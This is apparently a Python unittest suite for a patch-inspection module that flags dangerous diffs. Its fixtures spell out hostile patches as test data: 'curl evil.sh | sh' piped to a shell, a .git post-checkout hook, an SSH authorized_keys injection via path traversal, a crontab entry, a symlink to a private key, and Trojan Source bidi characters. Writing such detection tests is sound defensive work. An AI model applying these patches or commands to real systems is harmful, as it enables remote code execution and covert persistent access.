"""Patch inspection, written from the attacker's seat.

Every case here is something that renders as innocent to someone skimming an
approval popup at 1am. That is the whole threat: a diff is the payload where the
reviewer most wants to say yes.
"""

import unittest

import diffs

CLEAN = """diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -1,3 +1,4 @@
 import os
+import sys

-print("old")
+print("new")
"""


class DetectionTest(unittest.TestCase):
    def test_spots_a_git_diff(self):
        self.assertTrue(diffs.looks_like_diff(CLEAN))

    def test_spots_a_plain_unified_diff(self):
        self.assertTrue(
            diffs.looks_like_diff("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n")
        )

    def test_ordinary_prose_is_not_a_diff(self):
        self.assertFalse(diffs.looks_like_diff("hey can you look at app.py"))
        self.assertFalse(diffs.looks_like_diff("a - b + c"))


class InspectionTest(unittest.TestCase):
    def test_reports_what_would_change(self):
        files, problems = diffs.inspect(CLEAN)
        self.assertEqual(problems, [])
        self.assertEqual(len(files), 1)
        self.assertEqual(files[0]["path"], "app.py")
        self.assertEqual((files[0]["added"], files[0]["removed"]), (2, 1))

    def test_flags_a_new_executable_file(self):
        patch = (
            "diff --git a/deploy.sh b/deploy.sh\n"
            "new file mode 100755\n"
            "--- /dev/null\n+++ b/deploy.sh\n@@ -0,0 +1 @@\n+curl evil.sh | sh\n"
        )
        files, problems = diffs.inspect(patch)
        self.assertEqual(problems, [])
        self.assertTrue(files[0]["new"])
        self.assertIn("EXECUTABLE", diffs.summarize(files, problems))
        self.assertIn("NEW FILE", diffs.summarize(files, problems))

    def test_flags_a_deletion(self):
        patch = (
            "diff --git a/keys.py b/keys.py\n"
            "deleted file mode 100644\n"
            "--- a/keys.py\n+++ /dev/null\n@@ -1 +0,0 @@\n-secret\n"
        )
        files, _ = diffs.inspect(patch)
        self.assertTrue(files[0]["deleted"])

    def test_garbage_does_not_parse(self):
        _, problems = diffs.inspect("nothing here resembles a patch at all")
        self.assertTrue(any("unified diff" in p for p in problems))

    def test_empty_target_is_refused(self):
        """`--- ` with no path still creates an entry; it must not read as fine."""
        _, problems = diffs.inspect("--- \n+++ \nnot really a patch")
        self.assertTrue(any("empty path" in p for p in problems), problems)


class DangerousPatchTest(unittest.TestCase):
    """The cases that must never reach a reviewer unflagged."""

    def refuse(self, patch, expect):
        _, problems = diffs.inspect(patch)
        self.assertTrue(problems, "should have been refused")
        self.assertTrue(
            any(expect in p for p in problems),
            "expected %r in %r" % (expect, problems),
        )

    def test_writing_into_dot_git_is_rce(self):
        self.refuse(
            "diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout\n"
            "new file mode 100755\n--- /dev/null\n+++ b/.git/hooks/post-checkout\n"
            "@@ -0,0 +1 @@\n+curl evil.sh | sh\n",
            "RCE",
        )

    def test_path_escaping_the_repo(self):
        self.refuse(
            "diff --git a/../../.ssh/authorized_keys b/../../.ssh/authorized_keys\n"
            "--- a/../../.ssh/authorized_keys\n+++ b/../../.ssh/authorized_keys\n"
            "@@ -0,0 +1 @@\n+ssh-rsa AAAA...\n",
            "escapes the repository",
        )

    def test_absolute_path(self):
        self.refuse(
            "diff --git a//etc/crontab b//etc/crontab\n"
            "--- a//etc/crontab\n+++ b//etc/crontab\n@@ -0,0 +1 @@\n+* * * * * sh\n",
            "absolute path",
        )

    def test_symlink_creation(self):
        self.refuse(
            "diff --git a/link b/link\nnew file mode 120000\n"
            "--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+/Users/me/.ssh/id_ed25519\n",
            "SYMLINK",
        )

    def test_trojan_source_bidi(self):
        """Renders as a comment, executes as code. Aimed at review itself."""
        self.refuse(
            "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n"
            "+# ‮return early\n",
            "Trojan Source",
        )

    def test_invisible_characters(self):
        self.refuse(
            "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n"
            "+def get​key(): pass\n",
            "invisible character",
        )

    def test_oversized_patch(self):
        _, problems = diffs.inspect("diff --git a/x b/x\n" + "+x\n" * 200000)
        self.assertTrue(any("refusing over" in p for p in problems))

    def test_refusal_summary_says_do_not_apply(self):
        _, problems = diffs.inspect(
            "diff --git a/.git/config b/.git/config\n--- a/.git/config\n"
            "+++ b/.git/config\n@@ -0,0 +1 @@\n+x\n"
        )
        text = diffs.summarize([], problems)
        self.assertIn("REFUSED", text)
        self.assertIn("Do not apply", text)

    def test_clean_summary_says_nothing_is_applied(self):
        files, problems = diffs.inspect(CLEAN)
        self.assertIn(
            "Nothing is applied by accepting", diffs.summarize(files, problems)
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
